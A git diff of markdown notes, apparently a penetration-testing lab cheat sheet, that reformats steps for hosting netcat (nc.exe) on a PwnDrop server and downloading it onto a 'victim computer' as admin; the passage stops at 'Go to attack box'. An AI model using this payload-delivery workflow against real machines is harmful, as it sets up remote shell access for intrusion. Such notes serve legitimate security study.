@@ -63,8 +63,10 @@ SSH/SCP - pretty simple
 Meterpreter
 
 # PwnDrop Usage
-1st - You need to update the PwnDrop.ini file after install (Configuration to update your IP and Port)
-<br><br>
+1st - 
+```
+You need to update the PwnDrop.ini file after install (Configuration to update your IP and Port)
+```
 2nd -
 ```
 # cd /home/kali/tools/PwnDrop/build
@@ -73,22 +75,29 @@ Meterpreter
 ```
 # ./pwndrop start
 ```
-4th - Go to 127.0.0.1:pwndrop <br>
-
+4th - 
+```
+Go to 127.0.0.1:pwndrop <br>
+```
 5th -
 ```
 [/home/kali/tools/pwndrop/build] # locate nc.exe 
 [/home/kali/tools/pwndrop/build] # /usr/share/windows-resources/binaries/nc.exe
 ```
-6th - Upload to PwnDrop (Upload Folder)<br>
-
-7th - Go to victim computer -> access ServerIP link (IP Address:pwndrop)
-
-8th - Save file to C:\ drive
+6th - 
 ```
-> cmd (as admin)
-> cd C:\ (Should see file)
-> dir
+Upload to PwnDrop (Upload Folder)<br>
+```
+7th - 
+```
+Go to victim computer -> access ServerIP link (IP Address:pwndrop)
+```
+8th - 
+```
+(Save file to C:\ drive)
+> run cmd.exe as admin
+> cd C:\
+> dir (should see file)
 ```
 9th - Go to attack box
 ```
